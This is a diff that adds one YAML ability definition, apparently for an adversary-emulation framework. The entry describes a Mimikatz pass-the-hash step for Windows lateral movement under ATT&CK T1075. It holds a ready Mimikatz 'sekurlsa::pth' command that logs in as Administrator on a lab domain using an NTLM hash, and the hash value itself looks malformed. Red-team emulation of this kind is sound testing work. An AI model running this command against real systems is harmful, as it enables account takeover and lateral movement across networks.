@@ -1,0 +1,14 @@
+---
+
+- id: taclater-1075-AR00-1v00-200120190845
+  name: Mimikatz Pass the Hash
+  description: .      Note: must dump hashes first.      [Reference](https://github.com/gentilkiwi/mimikatz/wiki/module-~-sekurlsa#pth).  
+  tactic: lateral-movement
+  technique:
+    attack_id: T1075
+    name: Pass the Hash
+  platforms:
+    windows:
+      cmd:
+        command: |
+          mimikatz # sekurlsa::pth /user:Administrator /domain:sec-lab.local /ntlm:cc36cf7a8514893efccd3324464tkg1a
